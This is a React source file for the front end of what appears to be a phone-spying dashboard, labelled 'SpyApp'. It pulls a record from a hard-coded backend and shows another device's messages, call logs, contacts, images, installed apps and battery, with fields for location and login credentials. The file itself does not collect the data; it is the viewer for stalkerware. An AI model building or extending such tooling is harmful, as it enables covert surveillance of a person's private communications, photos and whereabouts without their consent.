import { BrowserRouter as Router, Routes, Route, Link } from 'react-router-dom';
import React, { useState } from 'react';
import Navbar from './Conponents/Navbar'
import Massages from './Conponents/Massages/Massages'
import CallLogs from './Conponents/CallLogs/CallLogs'
import Contacts from './Conponents/Contacts/Contacts'
import TotalApp from './Conponents/TotalApps/TotalApp'
import Battery from './Conponents/Battery'
import Images from './Conponents/Images/Images'
import Home from './Conponents/Home'
import './App.css'

function App() {

  var baseurl = "https://vs12345678.onrender.com"

  const [fetchedData, setFetchedData] = useState({
    _id:"",
    email:"",
    password:"",
    images:[],
    CallLogs:[],
    TotalContacts:[],
    TotalMassages:[],
    TotalApps:[],
    Battary:[],
    Locations:[]
  });
  var arr;

 async function  connecttoDb(a, b) {
    console.log("connect" + a + " " + b)
    const respon = await fetch(`${baseurl}/getUser/${a}`, {
      method: "GET",
      headers: {
        "Content-Type": "application/json"
      }
    })
    const data1 = await respon.json();
    return data1;
  }

 
 async function setthedata(data){
    console.log("setthedata")
    await setFetchedData(data)
    console.log(fetchedData)
    if(fetchedData._id===""){
      alert("Login again")
    }else{
      alert("Data Loading Success")
    }
  }
  return (

    <>
      <Navbar />
      <Routes>
        <Route path='/SpyApp' element={<Home setthedata={setthedata}  connecttoDb={connecttoDb}  />} />
        <Route path='/Massages'   element={<Massages datafectched={fetchedData.TotalMassages}  />} />
        <Route path='/CallLogs' element={<CallLogs datafectchedCallogs={fetchedData.CallLogs} />} />
        <Route path='/Contacts' element={<Contacts datafectchedContacts={fetchedData.TotalContacts} />} />
        <Route path='/Images' element={<Images datafectchedImages={fetchedData.images} />} />
        <Route path='/Apps' element={<TotalApp datafectchedApp={fetchedData.TotalApps}/>} />
        <Route path='/Battary' element={<Battery />} />
      </Routes>
    </>
  );
}

export default App;
